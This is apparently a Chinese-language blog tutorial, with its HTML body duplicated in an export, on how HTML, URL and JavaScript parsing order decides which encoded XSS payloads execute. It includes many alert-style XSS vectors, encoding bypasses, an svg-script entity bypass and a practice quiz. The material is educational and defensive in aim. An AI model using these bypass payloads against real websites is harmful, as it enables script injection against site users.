class=\"headerlink\" title=\"属性值中的解析\"></a>属性值中的解析</h3><p><code>&lt;a href=&quot;javascript:alert&amp;#40;1)&quot;&gt;&lt;/a&gt;</code></p>\n<p><img class=\"lazyload\" data-original=\"https://raw.githubusercontent.com/59lx/userful_photo/master/myblog_photos/xss_payload_new/xss_3.png\" src=\"data:image/gif;base64,iVBORw0KGgoAAAANSUhEUgAAAAEAAAABCAYAAAAfFcSJAAAADUlEQVQImWNgYGBgAAAABQABh6FO1AAAAABJRU5ErkJggg==\" alt=\"xss_3\"></p>\n<p>可以看到 ‘(‘ 被解码。</p>\n<h3 id=\"RCDATA状态下的字符引用\"><a href=\"#RCDATA状态下的字符引用\" class=\"headerlink\" title=\"RCDATA状态下的字符引用\"></a>RCDATA状态下的字符引用</h3><p>这时我们需要先了解下 HTML 中的 5 类元素</p>\n<figure class=\"highlight lsl\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br><span class=\"line\">5</span><br><span class=\"line\">6</span><br><span class=\"line\">7</span><br><span class=\"line\">8</span><br><span class=\"line\">9</span><br><span class=\"line\">10</span><br><span class=\"line\">11</span><br><span class=\"line\">12</span><br><span class=\"line\">13</span><br><span class=\"line\">14</span><br><span class=\"line\">15</span><br><span class=\"line\">16</span><br><span class=\"line\">17</span><br><span class=\"line\">18</span><br><span class=\"line\">19</span><br><span class=\"line\">20</span><br><span class=\"line\">21</span><br></pre></td><td class=\"code\"><pre><code class=\"hljs undefined\"><span class=\"hljs-number\">1.</span>  空元素(Void elements)，如&lt;area&gt;,&lt;br&gt;,&lt;base&gt;等等<br><br><span class=\"hljs-number\">2.</span>  原始文本元素(Raw text elements)，有&lt;script&gt;和&lt;style&gt;<br><br><span class=\"hljs-number\">3.</span>  RCDATA元素(RCDATA elements)，有&lt;textarea&gt;和&lt;title&gt;<br><br><span class=\"hljs-number\">4.</span>  外部元素(Foreign elements)，例如MathML命名空间或者SVG命名空间的元素<br><br><span class=\"hljs-number\">5.</span>  基本元素(Normal elements)，即除了以上<span class=\"hljs-number\">4</span>种元素以外的元素<br><br>五类元素的区别如下：<br><br><span class=\"hljs-number\">1.</span>  空元素，不能容纳任何内容（因为它们没有闭合标签，没有内容能够放在开始标签和闭合标签中间）。<br><br><span class=\"hljs-number\">2.</span>  原始文本元素，可以容纳文本。<br><br><span class=\"hljs-number\">3.</span>  RCDATA元素，可以容纳文本和字符引用。<br><br><span class=\"hljs-number\">4.</span>  外部元素，可以容纳文本、字符引用、CDATA段、其他元素和注释<br><br><span class=\"hljs-number\">5.</span>  基本元素，可以容纳文本、字符引用、其他元素和注释<br></code></pre></td></tr></table></figure>\n\n\n\n<p>由于 RCDATA 状态中可以转义字符实体，那么在像 <strong>textarea</strong> <strong>title</strong> 等标签中就可以字符引用。这里 还有一个特殊的点就是在 <strong>RCDATA</strong> 元素标签 的内容中，遇到 <code>&lt;</code> 后，会进入 <strong>RCADATA小于号状态</strong>，如果紧接着不是<code>/</code>字符的话，就会返回到 <strong>RCDATA状态</strong>。那么也就是说在 <strong>textarea</strong>或者<strong>title</strong>标签中只能认识并解析的标签只有对应的 <strong></strong>或者 <strong></strong>,不会有新标签的产生，也就杜绝了脚本的执行。例如：</p>\n<p><code>&lt;textarea&gt;&lt;script&gt;alert(6)&lt;/script&gt;&lt;/textarea&gt;</code></p>\n<p>是不会执行的。</p>\n<h2 id=\"2、URL-解析\"><a href=\"#2、URL-解析\" class=\"headerlink\" title=\"2、URL 解析\"></a>2、URL 解析</h2><p>同样的，URL 解析器依旧可以看做一个状态机，其解析规则在<a href=\"http://url.spec.whatwg.org/\" target=\"_blank\" rel=\"noopener\">这里</a>。这里只提几个 xss_payload 能涉及到的地方。</p>\n<p>1、首先，资源类型必须是大写字母或者小写字母，否则会进入到无状态类型。那首先就要求资源的协议要保证格式完全的正确,譬如使用 <strong>javascript:</strong> 伪协议时不能使用编码来绕过，因为这会让 URL 解析器跳转到 ‘ 无类型 ’状态，导致资源不能正确解析，我们构造的 payload 也就不能得到正确的执行，我们来看看下面的例子：</p>\n<p><code>&lt;a href=&quot;%6a%61%76%61%73%63%72%69%70%74:alert(1)&quot;&gt;text&lt;/a&gt;</code> 编码了 <strong>javascript</strong>，可以看到无法正确执行。</p>\n<p><img class=\"lazyload\" data-original=\"https://raw.githubusercontent.com/59lx/userful_photo/master/myblog_photos/xss_payload_new/xss_4.png\" src=\"data:image/gif;base64,iVBORw0KGgoAAAANSUhEUgAAAAEAAAABCAYAAAAfFcSJAAAADUlEQVQImWNgYGBgAAAABQABh6FO1AAAAABJRU5ErkJggg==\" alt=\"xss_4\"></p>\n<p>从图中可以看出，得到的跳转地址是 <strong><a href=\"http://localhost/javascript:alert(1)\" target=\"_blank\" rel=\"noopener\">http://localhost/javascript:alert(1)</a></strong>，原因就是没有正确的识别资源的协议类型，拼接到了默认地址的后面，导致 payload 无法执行。</p>\n<p>2、其次，URL 编码过程使用的是 UTF-8 编码，如果给 URL 进行别种方式的编码，会导致 URL 解析器不能正确识别。</p>\n<h3 id=\"HTML-中的两种-URL资源的执行\"><a href=\"#HTML-中的两种-URL资源的执行\" class=\"headerlink\" title=\"HTML 中的两种 URL资源的执行\"></a>HTML 中的两种 URL资源的执行</h3><p>我们可以利用伪协议来进行 xss 的反射攻击，而在HTML 标签中有两种 url 的连接类型，一种是 <code>src</code>，一种是 <code>href</code>，我们先来看看两者的区别</p>\n<h4 id=\"1、src\"><a href=\"#1、src\" class=\"headerlink\" title=\"1、src\"></a>1、src</h4><p>src 适用于替换当前元素，是 source 的缩写，指向外部资源的位置，指向的内容会 <strong>自动的</strong> 嵌入到文档中标签的位置。请求 src 资源的时候会将其指向的资源下载并应用到文档内。例如 js 脚本，img 图片，frame 元素等。</p>\n<h4 id=\"2、href\"><a href=\"#2、href\" class=\"headerlink\" title=\"2、href\"></a>2、href</h4><p>href 是 Hypertext Reference 的缩写，指向网络资源的所在位置，是与该页面有关联的，是引用。</p>\n<p><strong>src</strong>与 <strong>href</strong> 的主要区别就是 一个是引入，一个是引用。</p>\n<p>之前在很多地方看到 payload 都有这种 src 引用的格式</p>\n<p><code>&lt;img src=&quot;javascript:alert(0);&quot;&gt;</code></p>\n<p>但是现在在 Chrome 与 Firefox 上实验了下都不能执行。原因就是当下的一部分浏览器<strong>为了防止恶意代码的注入，已经禁用了 src 属性的 javascript 的伪协议</strong>。我们还有一种引入外部 js 文件的 src 利用方式：</p>\n<p><code>&lt;script src=&quot;evil.js&quot;&gt;&lt;/script&gt;</code></p>\n<p>其中 evil.js 中的内容为</p>\n<figure class=\"highlight lisp\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br></pre></td><td class=\"code\"><pre><code class=\"hljs undefined\">alert(<span class=\"hljs-name\">/xss/</span>)<span class=\"hljs-comment\">;</span><br></code></pre></td></tr></table></figure>\n\n<h2 id=\"3、-Javascript-解析\"><a href=\"#3、-Javascript-解析\" class=\"headerlink\" title=\"3、 Javascript 解析\"></a>3、 Javascript 解析</h2><p>详见 javascript 的<a href=\"http://www.ecma-international.org/publications/standards/Ecma-262.htm\" target=\"_blank\" rel=\"noopener\">解析规则</a></p>\n<p>因为 js 脚本一般是内嵌在 HTML 页面中的，所以 javascript 的解析容易与 HTML 解析搞混了。Javascript 的解析需要注意的点有下面两点：</p>\n<h3 id=\"script-标签的解析\"><a href=\"#script-标签的解析\" class=\"headerlink\" title=\"script 标签的解析\"></a>script 标签的解析</h3><p>在之前，我们提到过 HTML 中的 5 类元素，其中 <strong>script</strong> 标签属于 <strong>原始文本数据</strong>,。它有个特别的解析属性就是虽然内嵌在了 HTML 界面的数据状态，但是仍然不能解析字符引用。看看下面这个例子：</p>\n<figure class=\"highlight html\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br><span class=\"line\">5</span><br><span class=\"line\">6</span><br><span class=\"line\">7</span><br><span class=\"line\">8</span><br><span class=\"line\">9</span><br><span class=\"line\">10</span><br><span class=\"line\">11</span><br><span class=\"line\">12</span><br><span class=\"line\">13</span><br></pre></td><td class=\"code\"><pre><code class=\"hljs html\"><span class=\"hljs-meta\">&lt;!DOCTYPE <span class=\"hljs-meta-keyword\">html</span>&gt;</span><br><span class=\"hljs-tag\">&lt;<span class=\"hljs-name\">html</span> <span class=\"hljs-attr\">lang</span>=<span class=\"hljs-string\">\"en\"</span>&gt;</span><br><span class=\"hljs-tag\">&lt;<span class=\"hljs-name\">head</span>&gt;</span><br>    <span class=\"hljs-tag\">&lt;<span class=\"hljs-name\">meta</span> <span class=\"hljs-attr\">charset</span>=<span class=\"hljs-string\">\"UTF-8\"</span>&gt;</span><br>    <span class=\"hljs-tag\">&lt;<span class=\"hljs-name\">meta</span> <span class=\"hljs-attr\">name</span>=<span class=\"hljs-string\">\"viewport\"</span> <span class=\"hljs-attr\">content</span>=<span class=\"hljs-string\">\"width=device-width, initial-scale=1.0\"</span>&gt;</span><br>    <span class=\"hljs-tag\">&lt;<span class=\"hljs-name\">meta</span> <span class=\"hljs-attr\">http-equiv</span>=<span class=\"hljs-string\">\"X-UA-Compatible\"</span> <span class=\"hljs-attr\">content</span>=<span class=\"hljs-string\">\"ie=edge\"</span>&gt;</span><br>    <span class=\"hljs-tag\">&lt;<span class=\"hljs-name\">title</span>&gt;</span>Document<span class=\"hljs-tag\">&lt;/<span class=\"hljs-name\">title</span>&gt;</span><br><span class=\"hljs-tag\">&lt;/<span class=\"hljs-name\">head</span>&gt;</span><br><span class=\"hljs-tag\">&lt;<span class=\"hljs-name\">body</span>&gt;</span><br>    <span class=\"hljs-tag\">&lt;<span class=\"hljs-name\">script</span>&gt;</span><span class=\"handlebars\"><span class=\"xml\"><span class=\"hljs-symbol\">&amp;lt;</span></span></span><span class=\"hljs-tag\">&lt;/<span class=\"hljs-name\">script</span>&gt;</span><br>    <span class=\"hljs-symbol\">&amp;lt;</span><br><span class=\"hljs-tag\">&lt;/<span class=\"hljs-name\">body</span>&gt;</span><br><span class=\"hljs-tag\">&lt;/<span class=\"hljs-name\">html</span>&gt;</span><br></code></pre></td></tr></table></figure>\n\n<p><img class=\"lazyload\" data-original=\"https://raw.githubusercontent.com/59lx/userful_photo/master/myblog_photos/xss_payload_new/xss_5.png\" src=\"data:image/gif;base64,iVBORw0KGgoAAAANSUhEUgAAAAEAAAABCAYAAAAfFcSJAAAADUlEQVQImWNgYGBgAAAABQABh6FO1AAAAABJRU5ErkJggg==\" alt=\"xss_5\"></p>\n<p>可以看到，里面的字符引用并没有被解码。</p>\n<h3 id=\"unicode-字符编码的解析\"><a href=\"#unicode-字符编码的解析\" class=\"headerlink\" title=\"unicode 字符编码的解析\"></a>unicode 字符编码的解析</h3><p>在之前的基础铺垫的时候提到了 js 中 unicode 的编码问题，那么它们在脚本的什么位置会被解析？又会被解析成什么意思？unicode 大致有以下三个位置会被解析，但是解析的意义有些许不同。</p>\n<h4 id=\"1、字符串中\"><a href=\"#1、字符串中\" class=\"headerlink\" title=\"1、字符串中\"></a>1、字符串中</h4><p>unicode 放在字符串中的时候会被解析，但是只是会解析为常规的字符，不会解释为破坏上下文的特殊意义的字符。请看下例子：</p>\n<figure class=\"highlight html\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br></pre></td><td class=\"code\"><pre><code class=\"hljs html\"><span class=\"hljs-tag\">&lt;<span class=\"hljs-name\">script</span>&gt;</span><span class=\"javascript\"><br>      <span class=\"hljs-keyword\">var</span> str = <span class=\"hljs-string\">'\\u0027'</span>;<br>      <span class=\"hljs-built_in\">document</span>.write(str);<br></span><span class=\"hljs-tag\">&lt;/<span class=\"hljs-name\">script</span>&gt;</span><br></code></pre></td></tr></table></figure>\n\n<p><img class=\"lazyload\" data-original=\"https://raw.githubusercontent.com/59lx/userful_photo/master/myblog_photos/xss_payload_new/xss_6.png\" src=\"data:image/gif;base64,iVBORw0KGgoAAAANSUhEUgAAAAEAAAABCAYAAAAfFcSJAAAADUlEQVQImWNgYGBgAAAABQABh6FO1AAAAABJRU5ErkJggg==\" alt=\"xss_6\"></p>\n<p>可以看到，被编码的单引号只是解释为了单纯的字符，没有破坏 js 的上下文。</p>\n<h4 id=\"2、标识符中\"><a href=\"#2、标识符中\" class=\"headerlink\" title=\"2、标识符中\"></a>2、标识符中</h4><p>标识符包括函数名，属性名等。如果使用 unicode 编码这些数据的话，会被正确解释为上下文中的标识符，可以正确的运行。看下面这个例子：</p>\n<figure class=\"highlight javascript\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br></pre></td><td class=\"code\"><pre><code class=\"hljs javascript\">&lt;script&gt;\\u0064\\u006f\\u0063\\u0075\\u006d\\u0065\\u006e\\u0074.\\u0077\\u0072\\u0069\\u0074\\u0065(<span class=\"hljs-string\">'test_successfully@'</span>);<span class=\"xml\"><span class=\"hljs-tag\">&lt;/<span class=\"hljs-name\">script</span>&gt;</span></span><br></code></pre></td></tr></table></figure>\n\n<p>注意这里只编码了 <strong>document</strong> 和 <strong>write</strong>，并没有编码点号，因为测试结果显示无法编码点号进行执行，但这并不影响我们探测，因为一般利用到的函数都等都只是单纯的字母拼接。</p>\n<p><img class=\"lazyload\" data-original=\"https://raw.githubusercontent.com/59lx/userful_photo/master/myblog_photos/xss_payload_new/xss_7.png\" src=\"data:image/gif;base64,iVBORw0KGgoAAAANSUhEUgAAAAEAAAABCAYAAAAfFcSJAAAADUlEQVQImWNgYGBgAAAABQABh6FO1AAAAABJRU5ErkJggg==\" alt=\"xss_7\"></p>\n<p>成功解码并执行了打印函数。</p>\n<h4 id=\"３、控制字符\"><a href=\"#３、控制字符\" class=\"headerlink\" title=\"３、控制字符\"></a>３、控制字符</h4><p>当控制字符不在引号包围的时候，例如 <code>(</code> <code>)</code> <code>&#39;</code> <code>&quot;</code>这些字符，裸露在文档外面进行 unicode 编码，js 解析器不能将它们正确的解析为控制字符，仅仅会被解码为标识符亦或是字符串，所以，想要成功执行一个 js 函数，就必须保证括号为 <strong>()</strong>，而不是 <strong>\\u0028 \\u0029</strong>.</p>\n<p>综上，js 在解析 unicode 编码的时候，能赋予非字符意义的地方有且仅有<strong>标识符</strong>这一个位置。</p>\n<h1 id=\"4-解析流的顺序\"><a href=\"#4-解析流的顺序\" class=\"headerlink\" title=\"4@ 解析流的顺序\"></a>4@ 解析流的顺序</h1><p>前端这三大解析器一般是相互配合的，我们需要搞清楚他们配合的顺序，然后对应构造 payload ，才有可能正确的被解码执行。</p>\n<p>一般的解析顺序如下：</p>\n<p><strong>1、HTML 解析</strong></p>\n<p>浏览器从网络堆栈中获取内容后，会触发 HTML 解析器根据解析规则（上文链接）对文章进行词法的解析，在这一步中，所有的<strong>合理的字符引用都会被解码</strong>【合理即能够被解析的位置放入字符引用】，解析完成后 DOM 树就被创建好了。</p>\n<p><strong>2、JS or URL 解析</strong></p>\n<p>为什么第二步的解析顺序不确定呢，这与文档资源类型的顺序有关。其中 Js 解析器 负责文档中内嵌脚本，unicode 编码等的解析，URL 解析器负责解析碰到的 URL 资源的解码。但位置不同，可能会造成不同的解析顺序。试看下两例：</p>\n<figure class=\"highlight\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br><span class=\"line\">5</span><br><span class=\"line\">6</span><br></pre></td><td class=\"code\"><pre><code class=\"hljs javascript\">脚本1：<br> &lt;a href=\"javascript:%61%6c%65%72%74%28%31%29\"&gt;sequence_test&lt;/a&gt; 编码了 alert(1)<br> <br>脚本2：<br>&lt;a href=# onclick=\"window.\\u006f\\u0070\\u0065\\u006e('http://www.baidu.com')\"&gt;sequence_test&lt;/a&gt;   <br>    编码了open<br></code></pre></td></tr></table></figure>\n\n<p>其中</p>\n<p>脚本1先是由 url 解析器解析 href 中的资源，解析完成后进入 js 的上下文，所以 js 解析器再解析 js 的内容。</p>\n<p>脚本2先是由 js 解析器解析 onclick 中的 unicode 编码，编码完成后发现参数是 url 的上下文，这时 url 解析器介入解析。</p>\n<p>可以看到，不同的位置会导致不同的解析顺序。</p>\n<h1 id=\"5-xss-payload-的练习\"><a href=\"#5-xss-payload-的练习\" class=\"headerlink\" title=\"5@ xss_payload 的练习\"></a>5@ xss_payload 的练习</h1><p>下面给出了常见的几种弹窗的方法，通过上面的阅读与学习，来判断下是否可以成功执行代码。</p>\n<figure class=\"highlight\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br><span class=\"line\">5</span><br><span class=\"line\">6</span><br><span class=\"line\">7</span><br><span class=\"line\">8</span><br><span class=\"line\">9</span><br><span class=\"line\">10</span><br><span class=\"line\">11</span><br><span class=\"line\">12</span><br><span class=\"line\">13</span><br><span class=\"line\">14</span><br></pre></td><td class=\"code\"><pre><code class=\"hljs javascript\">1、  &lt;a href=\"%6a%61%76%61%73%63%72%69%70%74:%61%6c%65%72%74%28%31%29\"&gt;&lt;/a&gt;    <br>    url编码了 javascript:alert(1)<br> <br>2、  &lt;a href=\"&amp;#x6a;&amp;#x61;&amp;#x76;&amp;#x61;&amp;#x73;&amp;#x63;&amp;#x72;&amp;#x69;&amp;#x70;&amp;#x74;:%61%6c%65%72%74%28%32%29\"&gt;xss_test&lt;/a&gt;   <br>\t字符实体编码了 javascript url 编码了 alert(2)    <br><br>3、  &lt;a href=\"javascript%3aalert(3)\"&gt;test&lt;/a&gt;<br>    url 编码了 ：<br><br>4、  &lt;div&gt;&amp;#60;img src=x onerror=alert(4)&amp;#62;&lt;/div&gt;  <br>    字符实体编码了尖括号<br><br>5、  &lt;textarea&gt;&amp;#60;script&amp;#62;alert(5)&amp;#60;/script&amp;#62;&lt;/textarea&gt; <br>\t字符实体编码了尖括号<br></code></pre></td></tr></table></figure>\n\n<h3 id=\"解析\"><a href=\"#解析\" class=\"headerlink\" title=\"解析\"></a>解析</h3><p>1、 无法执行，因为编码了协议</p>\n<p>2、 可以执行，html 先解析字符实体编码 javascript ，url 解析器再解析 alert(2)，位置与格式都允许。</p>\n<p>3、 无法执行，因为协议被编码导致无法正确识别协议。</p>\n<p>4、 无法执行，因为嵌在数据状态内，只能解析字符引用为普通字符串，无特殊意义。</p>\n<p>5、无法执行，首先是因为在数据状态中只能将尖括号转义为字符串，其次 RCDATA 元素中不能嵌入新的标签，嵌入也无法执行代码。</p>\n<p>更多例子附带答案，<a href=\"http://test.attacker-domain.com/browserparsing/answers.txt\" target=\"_blank\" rel=\"noopener\">戳这</a></p>\n<h1 id=\"6-关于-svg-标签中解析-js-代码\"><a href=\"#6-关于-svg-标签中解析-js-代码\" class=\"headerlink\" title=\"6@ 关于 svg 标签中解析 js 代码\"></a>6@ 关于 svg 标签中解析 js 代码</h1><p>上面写道 <strong>svg</strong> 标签属于外部元素，<strong>script</strong> 标签属于原是文本元素，而且也知道 <strong>script</strong> 标签里面是不能转义字符实体编码的，那么我们考虑一下下面这段代码是否可以弹窗：</p>\n<p><code>&lt;svg&gt;&lt;script&gt;alert&amp;#40;/xss/)&lt;/script&gt;&lt;/svg&gt;</code></p>\n<p>按我们上面理解的话，<code>&lt;script&gt;</code> 标签下不能解析字符引用，就算可以解析，圆括号这种被放在数据状态下的解码也只能成为字符串，并不能被解析为控制字符。</p>\n<p>所以不能码？上图～</p>\n<p><img class=\"lazyload\" data-original=\"https://raw.githubusercontent.com/59lx/userful_photo/master/myblog_photos/xss_payload_new/xss_8.png\" src=\"data:image/gif;base64,iVBORw0KGgoAAAANSUhEUgAAAAEAAAABCAYAAAAfFcSJAAAADUlEQVQImWNgYGBgAAAABQABh6FO1AAAAABJRU5ErkJggg==\" alt=\"xss_8\"></p>\n<p><img class=\"lazyload\" data-original=\"https://raw.githubusercontent.com/59lx/userful_photo/master/myblog_photos/xss_payload_new/xss_9.png\" src=\"data:image/gif;base64,iVBORw0KGgoAAAANSUhEUgAAAAEAAAABCAYAAAAfFcSJAAAADUlEQVQImWNgYGBgAAAABQABh6FO1AAAAABJRU5ErkJggg==\" alt=\"xss_9\"></p>\n<p>太夸张了，不仅解码了字符引用，还转换为了控制字符并且弹窗了～</p>\n<p>按照上面的分析，问题绝对就在 <strong>svg</strong> 这个标签上面。</p>\n<p><code>&lt;svg&gt;</code>这个标签 使用 XML 格式定义图形，XML 会解析字符实体，而 w3c 上面给出的这段实例代码中也可以看出 xml 使用的端倪。</p>\n<figure class=\"highlight html\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br><span class=\"line\">5</span><br><span class=\"line\">6</span><br><span class=\"line\">7</span><br><span class=\"line\">8</span><br><span class=\"line\">9</span><br><span class=\"line\">10</span><br><span class=\"line\">11</span><br></pre></td><td class=\"code\"><pre><code class=\"hljs html\"><span class=\"hljs-meta\">&lt;!DOCTYPE <span class=\"hljs-meta-keyword\">html</span>&gt;</span><br><span class=\"hljs-tag\">&lt;<span class=\"hljs-name\">html</span>&gt;</span><br><span class=\"hljs-tag\">&lt;<span class=\"hljs-name\">body</span>&gt;</span><br><br><span class=\"hljs-tag\">&lt;<span class=\"hljs-name\">svg</span> <span class=\"hljs-attr\">xmlns</span>=<span class=\"hljs-string\">\"http://www.w3.org/2000/svg\"</span> <span class=\"hljs-attr\">version</span>=<span class=\"hljs-string\">\"1.1\"</span> <span class=\"hljs-attr\">height</span>=<span class=\"hljs-string\">\"190\"</span>&gt;</span><br>  <span class=\"hljs-tag\">&lt;<span class=\"hljs-name\">polygon</span> <span class=\"hljs-attr\">points</span>=<span class=\"hljs-string\">\"100,10 40,180 190,60 10,60 160,180\"</span><br>  <span class=\"hljs-attr\">style</span>=<span class=\"hljs-string\">\"fill:lime;stroke:purple;stroke-width:5;fill-rule:evenodd;\"</span> /&gt;</span><br><span class=\"hljs-tag\">&lt;/<span class=\"hljs-name\">svg</span>&gt;</span><br><br><span class=\"hljs-tag\">&lt;/<span class=\"hljs-name\">body</span>&gt;</span><br><span class=\"hljs-tag\">&lt;/<span class=\"hljs-name\">html</span>&gt;</span><br></code></pre></td></tr></table></figure>\n\n<p>那么为什么 <strong>script</strong> 标签可以被解析呢？原因就是 <strong>svg</strong> 标签支持 嵌入 <strong>script</strong> 标签。</p>\n<p>这是支持 <strong>script</strong> 标签的<a href=\"https://www.w3.org/TR/SVG11/script.html\" target=\"_blank\" rel=\"noopener\">文档</a>借用引用文章作者的话来讲就是：</p>\n<p>这个 payload 之所以可以执行是因为遵循了 <strong>svg</strong> 和 <strong>xml</strong> 的标准。</p>\n<h1 id=\"7-总结\"><a href=\"#7-总结\" class=\"headerlink\" title=\"7@ 总结\"></a>7@ 总结</h1><p>理解一个漏洞的利用，需要也有必要挖的深些，这样才能更好的从攻与防的角度来构造攻击向量，亦或是根据攻击的思路来构造防御的 waf。</p>\n<p><code>Reference</code>:</p>\n<p><code>https://www.cnblogs.com/polk6/p/html-entity.html</code></p>\n<p><code>https://www.cnblogs.com/liuxianan/p/display-unicode-character-in-html-css-and-js.html</code></p>\n<p><code>https://zhidao.baidu.com/question/583316301.html</code></p>\n<p><code>https://bbs.csdn.net/topics/392055451</code></p>\n<p><code>http://test.attacker-domain.com/browserparsing/answers.txt</code></p>\n<p><code>http://test.attacker-domain.com/browserparsing/tests.html</code></p>\n<p><code>http://bobao.360.cn/learning/detail/292.html</code></p>\n<p><code>https://www.hackersb.cn/hacker/85.html</code></p>\n<p><code>http://www.w3school.com.cn/html5/html_5_svg.asp</code></p>\n<p><code>https://www.w3.org/TR/SVG11/script.html</code></p>\n","site":{"data":{}},"excerpt":"","more":"<h1 id=\"1-前言\"><a href=\"#1-前言\" class=\"headerlink\" title=\"1@ 前言\"></a>1@ 前言</h1><p>当利用编码来绕过有关 xss 的 waf 的时候，有时我们构造的 payload 得不到执行。纵然你的编码方式是对的，但是如果对应的解析器不解析你的攻击向量，也是徒劳的。这时候我们就需要比较清晰的了解自己的 payload 所遵守的解析策略与经历的解析流程，然后构造出更加有针对性的攻击向量。</p>\n<h1 id=\"2-基础铺垫\"><a href=\"#2-基础铺垫\" class=\"headerlink\" title=\"2@ 基础铺垫\"></a>2@ 基础铺垫</h1><p>在了解一个 payload 解析流程之前，我们需要先熟悉一些用到的基础知识。</p>\n<h2 id=\"2-1-HTML字符实体\"><a href=\"#2-1-HTML字符实体\" class=\"headerlink\" title=\"2.1 HTML字符实体\"></a>2.1 HTML字符实体</h2><p>在 HTML 中，字符实体其实就是转义序列，一般是为了正确显示保留，如 <strong>‘&lt;’</strong>, <strong>‘&gt;’</strong>, <strong>空格</strong>等。HTML 中的实体转义格式有以下两种：</p>\n<h3 id=\"Entity-name-（实体名称）\"><a href=\"#Entity-name-（实体名称）\" class=\"headerlink\" title=\"Entity name （实体名称）\"></a>Entity name （实体名称）</h3><p>格式 ： <strong>&amp;实体名;</strong></p>\n<p>eg ： <code>&amp;lt;</code> （less than）表示 ‘&lt;’</p>\n<p><a href=\"http://www.w3school.com.cn/html/html_entities.asp\" target=\"_blank\" rel=\"noopener\">更多的字符实体名戳这里</a></p>\n<h3 id=\"Entity-Number-实体编号\"><a href=\"#Entity-Number-实体编号\" class=\"headerlink\" title=\"Entity Number (实体编号)\"></a>Entity Number (实体编号)</h3><p>格式 ： <strong>&amp;实体编号;</strong></p>\n<p>其中实体编号可以 是 16 进制格式 <strong>&amp;#x</strong> 开头，或者 10 进制格式的 <strong>&amp;#</strong> 开头。</p>\n<p>eg ： <code>&amp;#65;</code> 表示字符 ‘A’ </p>\n<h2 id=\"2、-JS-中的-unicode-表示\"><a href=\"#2、-JS-中的-unicode-表示\" class=\"headerlink\" title=\"2、 JS 中的 unicode 表示\"></a>2、 JS 中的 unicode 表示</h2><p>格式 ：<strong>\\u + 16 进制的 unicode 编码</strong></p>\n<p>eg : <code>\\u5b89</code> 表示汉字 <strong>安</strong></p>\n<h1 id=\"3-攻击向量经历的三种解析\"><a href=\"#3-攻击向量经历的三种解析\" class=\"headerlink\" title=\"3@ 攻击向量经历的三种解析\"></a>3@ 攻击向量经历的三种解析</h1><h2 id=\"1、HTML-解析\"><a href=\"#1、HTML-解析\" class=\"headerlink\" title=\"1、HTML 解析\"></a>1、HTML 解析</h2><p>原版的 HTML 解析规则<a href=\"http://www.whatwg.org/specs/web-apps/current-work/multipage/tokenization.html\" target=\"_blank\" rel=\"noopener\">戳这</a>。</p>\n<p>eg : <code>&lt;a href=&quot;http://www.baidu.com&quot;&gt;text&lt;/a&gt;</code></p>\n<p>联想一下我们学过的数电，可以视 HTML 解析器为一个状态机，遍历获得的字符，按照规则进行状态的转换。以上面的例子：</p>\n<p>当碰到 <strong>&lt;</strong> 字符的时候，就会转换到标签开始状态 (Tag open state)【前提是紧跟字符不为 <strong>/</strong>】</p>\n<p>然后跳转到 标签名状态（Tag name state) 【对应例子里面的 a 】</p>\n<p>. . . . . .</p>\n<p>进入数据状态 (Data state) 【对应例子里面的 <strong>text</strong> 】, 在刚进入这个状态时，释放当前标签的 token 【对应例子里面的 a 标签的前部分】。在数据状态时，每发现一个完整的标签，就会释放一个 token.</p>\n<p>那么，是否存在这样一个位置状态，它可以将我们的字符实体解析并赋予本来的非字符的特殊意义(如 <code>&amp;lt;</code>表示 <strong>&lt;</strong>可以当标签开始符来对待，然后让其中的脚本执行)? 答案是：没有。这就与 HTML 解析 规则有关。我们再拿一个例子来讲：</p>\n<p><code>&lt;div&gt;&amp;lt;script&gt;alert(1);&lt;/script&gt;&lt;/div&gt;</code></p>\n<p>因为 div 标签开始后，解析器还是在数据状态，不会将这个字符引用转换为 ‘标签开始状态’，所以就可以保证我们得到的字符实体引用只会被解析为单纯的数据，而没有特殊意义，从而从一定程度上杜绝了一些风险。 <img class=\"lazyload\" data-original=\"https://raw.githubusercontent.com/59lx/userful_photo/master/myblog_photos/xss_payload_new/xss_1.png\" src=\"data:image/gif;base64,iVBORw0KGgoAAAANSUhEUgAAAAEAAAABCAYAAAAfFcSJAAAADUlEQVQImWNgYGBgAAAABQABh6FO1AAAAABJRU5ErkJggg==\" alt=\"xss_1\"></p>\n<p>从图中我们可以看出来，’&lt;’ 标签已经被转义，但是只是作为纯字符输出在页面中。之后的 由于未配对成功而被解析器去除。</p>\n<p>而在 HTML 中也并不是所有位置都会解析转义字符引用，有三种情况下会转义：</p>\n<h3 id=\"数据状态的解析\"><a href=\"#数据状态的解析\" class=\"headerlink\" title=\"数据状态的解析\"></a>数据状态的解析</h3><p><code>&lt;div&gt;&amp;lt;&amp;gt;&lt;/div&gt;</code></p>\n<p><img class=\"lazyload\" data-original=\"https://raw.githubusercontent.com/59lx/userful_photo/master/myblog_photos/xss_payload_new/xss_2.png\" src=\"data:image/gif;base64,iVBORw0KGgoAAAANSUhEUgAAAAEAAAABCAYAAAAfFcSJAAAADUlEQVQImWNgYGBgAAAABQABh6FO1AAAAABJRU5ErkJggg==\" alt=\"xss_2\"></p>\n<p>可以看到字符引用被解析。</p>\n<h3 id=\"属性值中的解析\"><a href=\"#属性值中的解析\" class=\"headerlink\" title=\"属性值中的解析\"></a>属性值中的解析</h3><p><code>&lt;a href=&quot;javascript:alert&amp;#40;1)&quot;&gt;&lt;/a&gt;</code></p>\n<p><img class=\"lazyload\" data-original=\"https://raw.githubusercontent.com/59lx/userful_photo/master/myblog_photos/xss_payload_new/xss_3.png\" 